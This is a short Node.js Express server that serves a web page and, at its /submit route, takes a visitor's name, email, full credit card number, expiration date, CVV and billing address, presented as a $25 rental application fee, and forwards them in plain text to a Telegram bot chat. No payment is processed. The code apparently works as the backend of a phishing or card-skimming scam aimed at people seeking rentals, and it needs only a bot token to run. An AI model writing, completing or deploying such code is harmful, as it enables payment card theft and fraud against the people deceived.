const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Replace with your Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

app.use(bodyParser.json());

// Serve static files from the "public" directory
app.use(express.static('public'));

// Serve index.html on the root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/submit', (req, res) => {
    const { name, email, creditCard, expDate, cvv, billingAddress } = req.body;

    // Construct the message to send to Telegram
    const message = `
        New Rental Application - $25.00 Fee Paid
        ----------------------------------------
        Name: ${name}
        Email: ${email}
        Credit Card Number: ${creditCard}
        Expiration Date: ${expDate}
        CVV: ${cvv}
        Billing Address: ${billingAddress}
    `;

    // Telegram API URL
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    // POST request payload
    const telegramPayload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    };

    // Send the message to Telegram
    fetch(telegramURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(telegramPayload)
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            res.json({ success: true });
        } else {
            res.json({ success: false, error: data.description });
        }
    })
    .catch(error => {
        res.json({ success: false, error: error.message });
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
